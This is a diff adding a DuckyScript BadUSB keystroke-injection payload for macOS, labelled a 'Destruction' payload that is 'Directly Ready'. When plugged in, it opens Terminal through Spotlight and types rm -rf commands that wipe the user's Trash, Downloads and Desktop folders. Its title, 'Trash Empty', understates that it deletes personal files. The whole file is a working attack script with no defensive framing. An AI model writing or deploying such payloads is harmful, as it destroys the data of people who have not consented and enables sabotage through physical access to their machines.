@@ -1,0 +1,29 @@
+REM Title: macOS Trash Empty
+REM Author: BadUSB Library
+REM Description: Empties trash and deletes files
+REM Target: macOS 10.15+
+REM Category: Destruction
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Empty trash
+STRING rm -rf ~/.Trash/*
+ENTER
+DELAY 2000
+
+REM Delete Downloads
+STRING rm -rf ~/Downloads/*
+ENTER
+DELAY 2000
+
+REM Delete Desktop
+STRING rm -rf ~/Desktop/*
+ENTER
+DELAY 2000
